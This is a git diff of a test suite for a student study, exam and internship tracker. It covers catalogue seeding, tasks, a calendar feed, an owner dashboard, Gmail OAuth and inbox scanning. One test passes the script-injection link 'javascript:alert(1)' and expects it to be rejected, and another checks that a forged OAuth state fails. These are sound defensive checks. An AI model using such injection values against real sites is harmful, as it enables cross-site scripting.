 describe('studies, exams and tasks', () => {
-  it('seeds the programme and exam catalogues once, then keeps user changes', () => {
-    const s = boot();
-    const data = s.ok('bootstrap');
-    expect(data.programs.length).toBeGreaterThan(100);
-    expect(data.exams.length).toBeGreaterThan(20);
-    expect(data.features.mail).toBe(true);
+  it('seeds the catalogues once, then keeps user changes', async () => {
+    const s = await boot();
+    const data = await s.ok('bootstrap');
     const mbz = data.programs.find((p: any) => /MBZUAI/.test(p.name) && /Natural Language/.test(p.name));
     expect(mbz).toMatchObject({ deadline: '2026-12-15', funding: 'full', confirmed: true, stage: 'shortlisted', fit: '' });
     const ese = data.exams.find((x: any) => x.key === 'upsc-ese-2027');
     expect(ese.stage).toBe('dropped');
-    const p = s.ok('updateProgram', mbz.id, { stage: 'preparing', docs: { sop: 'doing', lor: 'done', bogus: 'x' }, myNotes: 'Email Prof. X' }).program;
+    const p = (await s.ok('updateProgram', mbz.id, { stage: 'preparing', docs: { sop: 'doing', lor: 'done', bogus: 'x' }, myNotes: 'Email Prof. X' })).program;
     expect(p.docs).toEqual({ sop: 'doing', lor: 'done' });
-    const again = s.ok('refreshCatalogs');
+    const again = await s.ok('refreshCatalogs');
     expect(again.added).toBe(0);
     expect(again.programs.find((x: any) => x.id === mbz.id)).toMatchObject({ stage: 'preparing', myNotes: 'Email Prof. X' });
-    expect(s.ok('bootstrap').programs.length).toBe(data.programs.length);
+    expect((await s.ok('bootstrap')).programs.length).toBe(data.programs.length);
     const cse = data.exams.find((x: any) => x.key === 'upsc-cse-2027');
-    expect(s.ok('updateExam', cse.id, { stage: 'applied', applicationNo: 'OTR123' }).exam.stage).toBe('applied');
-    expect(s.call('updateExam', cse.id, { events: [] }).error?.code).toBe('BAD_INPUT');
-    const own = s.ok('createExam', { name: 'State PSC', events: [{ label: 'Prelims', date: '2027-06-01' }] }).exam;
+    expect((await s.ok('updateExam', cse.id, { stage: 'applied', applicationNo: 'OTR123' })).exam.stage).toBe('applied');
+    expect((await s.call('updateExam', cse.id, { events: [] })).error?.code).toBe('BAD_INPUT');
+    const own = (await s.ok('createExam', { name: 'State PSC', events: [{ label: 'Prelims', date: '2027-06-01' }] })).exam;
     expect(own.events).toEqual([{ label: 'Prelims', date: '2027-06-01', precision: 'day' }]);
   });
 
-  it('manages tasks with dates and times', () => {
-    const s = boot();
-    const t = s.ok('createTask', { title: 'Book IELTS', due: '2026-11-21T10:00', area: 'studies' }).task;
+  it('manages tasks with dates and times', async () => {
+    const s = await boot();
+    const t = (await s.ok('createTask', { title: 'Book IELTS', due: '2026-11-21T10:00', area: 'studies' })).task;
     expect(t).toMatchObject({ due: '2026-11-21T10:00', allDay: false, area: 'studies', status: 'todo' });
-    expect(s.ok('updateTask', t.id, { status: 'done' }).task.status).toBe('done');
-    expect(s.call('createTask', { title: 'x', due: 'tomorrowish' }).error?.code).toBe('BAD_INPUT');
-    expect(s.call('createTask', { title: 'x', link: 'javascript:alert(1)' }).error?.code).toBe('BAD_INPUT');
-    s.ok('deleteTask', t.id);
-    expect(s.ok('bootstrap').tasks).toHaveLength(0);
+    expect((await s.ok('updateTask', t.id, { status: 'done' })).task.status).toBe('done');
+    expect((await s.call('createTask', { title: 'x', due: 'tomorrowish' })).error?.code).toBe('BAD_INPUT');
+    expect((await s.call('createTask', { title: 'x', link: 'javascript:alert(1)' })).error?.code).toBe('BAD_INPUT');
+    await s.ok('deleteTask', t.id);
+    expect((await s.ok('bootstrap')).tasks).toHaveLength(0);
   });
 
-  it('applies a private seed once (profile, roadmap, abroad internships, ratings)', async () => {
-    const personal = {
+  it('serves a private calendar feed for Google or Apple Calendar', async () => {
+    const s = await boot();
+    await s.ok('createTask', { title: 'Submit SOP draft', due: '2026-12-02', area: 'studies' });
+    const { url } = await s.ok('calendarFeed');
+    expect(url).toMatch(/\/functions\/v1\/api\/ics\/[A-Za-z0-9_-]{20,}\.ics$/);
+    const res = await s.request(new URL(url).pathname.replace('/functions/v1/api', ''));
+    expect(res.headers.get('content-type')).toMatch(/text\/calendar/);
+    expect(await res.text()).toContain('Submit SOP draft');
+    const rotated = await s.ok('calendarFeed', true);
+    expect(rotated.url).not.toBe(url);
+    expect((await s.request(new URL(url).pathname.replace('/functions/v1/api', ''))).status).toBe(404);
+  });
+
+  it("applies the owner's private seed to the owner only", async () => {
+    setPersonalSeedForTests({
       version: 1,
       profile: { name: 'Seed User', skills: ['Python'], targetRoles: ['Machine Learning'] },
       ratings: { 'msc-natural-language-processing-mbzuai': { fit: 'top', note: 'Best fit' }, 'cactus-internship-max-planck-institutes': { fit: 'top', note: 'Strong' } },
       programStages: { 'msc-natural-language-processing-mbzuai': 'preparing' },
       tasks: [{ title: 'Book IELTS', due: '2026-11-21', area: 'studies' }],
-    };
-    const personalCode = (await buildServer({ config: { features: { mail: false }, personal } })).code;
-    const s = boot({ code: personalCode });
-    const data = s.ok('bootstrap');
+    });
+    const stranger = await boot();
+    const theirs = await stranger.ok('bootstrap');
+    expect(theirs.profile.name).toBe('');
+    expect(theirs.tasks).toEqual([]);
+    expect(theirs.jobs).toEqual([]);
+
+    const owner = await boot({ email: 'owner@student.example' });
+    const data = await owner.ok('bootstrap');
+    expect(data.user.isAdmin).toBe(true);
     expect(data.profile.name).toBe('Seed User');
     expect(data.tasks.map((t: any) => t.title)).toEqual(['Book IELTS']);
     expect(data.programs.find((p: any) => p.key === 'msc-natural-language-processing-mbzuai')).toMatchObject({ fit: 'top', note: 'Best fit', stage: 'preparing' });
     const abroad = data.jobs.filter((j: any) => j.sourceLabel === 'Research internships abroad');
     expect(abroad.length).toBeGreaterThan(10);
     expect(abroad.find((j: any) => /CaCT/.test(j.role)).notes).toContain('Strong');
-    expect(data.features.mail).toBe(false);
-    const again = s.ok('bootstrap');
+    const again = await owner.ok('bootstrap');
     expect(again.tasks).toHaveLength(1);
     expect(again.jobs.length).toBe(data.jobs.length);
   }, 60_000);
 });
 
-describe('mail', () => {
+describe('owner dashboard', () => {
+  it('shows numbers to the owner only, and can suspend an account', async () => {
+    const student = await boot();
+    await student.ok('bootstrap');
+    expect((await student.call('adminOverview')).error?.code).toBe('FORBIDDEN');
+    const owner = await boot({ email: 'owner@student.example' });
+    const { overview } = await owner.ok('adminOverview');
+    expect(overview.users).toBeGreaterThanOrEqual(2);
+    expect(overview.recent.some((u: any) => u.email === student.email)).toBe(true);
+    expect((await owner.call('adminSetBlocked', owner.userId, true)).error?.code).toBe('BAD_INPUT');
+    await owner.ok('adminSetBlocked', student.userId, true);
+    expect((await student.call('bootstrap')).error?.code).toBe('FORBIDDEN');
+    await owner.ok('adminSetBlocked', student.userId, false);
+    expect((await student.call('bootstrap')).ok).toBe(true);
+  });
+});
+
+describe('Gmail', () => {
+  it('connects with read-only consent and stores the token encrypted', async () => {
+    const s = await boot();
+    const { url } = await s.ok('connectGmail');
+    const google = new URL(url);
+    expect(google.origin).toBe('https://accounts.google.com');
+    expect(google.searchParams.get('scope')).toBe('https://www.googleapis.com/auth/gmail.readonly');
+    expect(google.searchParams.get('access_type')).toBe('offline');
+    expect(google.searchParams.get('login_hint')).toBe(s.email);
+
+    const forged = await s.request('/gmail/callback?code=good-code&state=forged.state');
+    expect(forged.headers.get('location')).toMatch(/gmail=error/);
+
+    const res = await s.connectGmail();
+    expect(res.status).toBe(302);
+    expect(res.headers.get('location')).toBe('https://app.example/interniq/#/mail?gmail=connected');
+    const [row] = await s.sql<{ refresh_token_enc: string; status: string }>('select refresh_token_enc, status from public.gmail_connections where user_id = $1', [s.userId]);
+    expect(row!.status).toBe('active');
+    expect(row!.refresh_token_enc).not.toContain('refresh-test');
+    const data = await s.ok('bootstrap');
+    expect(data.gmail).toMatchObject({ email: s.email, status: 'active' });
+    expect(data.settings.mail.enabled).toBe(true);
+  });
+
   it('reads the inbox, tracks applications, adds tasks and filters noise', async () => {
-    const { sampleInbox } = await import('../tools/fixtures.mjs');
     const inbox = sampleInbox();
-    const s = boot({ inbox: () => inbox });
-    s.ok('createJob', { company: 'Kestrel Maps', role: 'Software Engineer Intern', stage: 'applied' });
-    const out = s.ok('scanMail');
+    const s = await boot({ inbox: () => inbox });
+    await s.connectGmail();
+    await s.ok('createJob', { company: 'Kestrel Maps', role: 'Software Engineer Intern', stage: 'applied' });
+    const out = await s.ok('scanMail');
     expect(out.report.added).toBe(inbox.length);
     const byCompany = Object.fromEntries(out.jobs.map((j: any) => [j.company, j]));
     expect(byCompany['Lumen Labs'].stage).toBe('interviewing');
@@ -455,28 +496,44 @@ describe('mail', () => {
     const mbz = out.mail.find((m: any) => /MBZUAI/.test(m.subject));
     expect(mbz).toMatchObject({ area: 'studies', status: 'new' });
 
-    const second = s.ok('scanMail');
+    const second = await s.ok('scanMail');
     expect(second.report.added).toBe(0);
     expect(second.tasks.length).toBe(out.tasks.length);
 
     const upsc = out.mail.find((m: any) => /upsc/.test(m.from));
-    expect(s.ok('mailAction', upsc.id, 'task').task.area).toBe('exams');
+    expect((await s.ok('mailAction', upsc.id, 'task')).task.area).toBe('exams');
     const sable = out.mail.find((m: any) => /Sable/.test(m.fromName));
-    const tracked = s.ok('mailAction', sable.id, 'apply-stage');
+    const tracked = await s.ok('mailAction', sable.id, 'apply-stage');
     expect(tracked.job.stage).toBe('rejected');
-    expect(s.ok('mailAction', mbz.id, 'ignore').mail.status).toBe('ignored');
-    expect(s.call('mailAction', 'not-an-id!', 'done').error?.code).toBe('BAD_INPUT');
+    expect((await s.ok('mailAction', mbz.id, 'ignore')).mail.status).toBe('ignored');
+    expect((await s.call('mailAction', 'not-an-id!', 'done')).error?.code).toBe('BAD_INPUT');
   });
 
-  it('runs from the hourly worker and puts due items in the digest', async () => {
-    const { sampleInbox } = await import('../tools/fixtures.mjs');
+  it('scans hourly from the worker and handles revoked access', async () => {
     const inbox = sampleInbox();
-    const s = boot({ inbox: () => inbox });
-    s.ok('saveSettings', { automation: { enabled: true, hour: 0, timezone: 'UTC', digestThreshold: 99 } });
-    expect(s.state.triggers).toHaveLength(1);
-    s.ctx.worker();
-    expect(s.ok('bootstrap').mail.length).toBe(inbox.length);
-    expect(s.state.mail).toHaveLength(1);
-    expect(s.state.mail[0].htmlBody).toContain('Due in the next 2 days');
+    const s = await boot({ inbox: () => inbox });
+    expect((await s.call('scanMail')).error?.message).toMatch(/Connect Gmail/);
+    await s.connectGmail();
+    const run = await s.runWorker();
+    expect(run.did).toContain('mail');
+    expect((await s.ok('bootstrap')).mail.length).toBe(inbox.length);
+
+    // The student removes InternIQ in their Google account: the next scan says so.
+    await s.sql(`update public.gmail_connections set refresh_token_enc = $2 where user_id = $1`, [s.userId, await encryptText(s.env.secretsKey, 'revoked')]);
+    const r = await s.call('scanMail');
+    expect(r.error?.message).toMatch(/Reconnect Gmail/);
+    expect((await s.ok('bootstrap')).gmail.status).toBe('revoked');
+
+    await s.ok('disconnectGmail');
+    expect(s.state.revoked).toEqual(['revoked']);
+    expect((await s.ok('bootstrap')).gmail).toBeNull();
+  });
+
+  it('reports a cancelled consent screen back to the app', async () => {
+    const s = await boot();
+    const { url } = await s.ok('connectGmail');
+    const state = new URL(url).searchParams.get('state')!;
+    const res = await s.request(`/gmail/callback?error=access_denied&state=${encodeURIComponent(state)}`);
+    expect(decodeURIComponent(res.headers.get('location') ?? '')).toMatch(/gmail=error&reason=You cancelled/);
   });
 });
